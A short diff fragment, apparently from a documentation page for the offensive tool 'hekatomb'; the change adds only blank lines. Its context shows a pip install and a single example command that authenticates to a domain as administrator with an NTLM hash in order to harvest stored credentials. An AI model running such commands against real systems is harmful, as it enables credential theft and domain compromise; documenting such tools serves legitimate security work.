@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:37:12.956175+00:00'
 pip3 install hekatomb
 hekatomb -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp
 ```
+
+
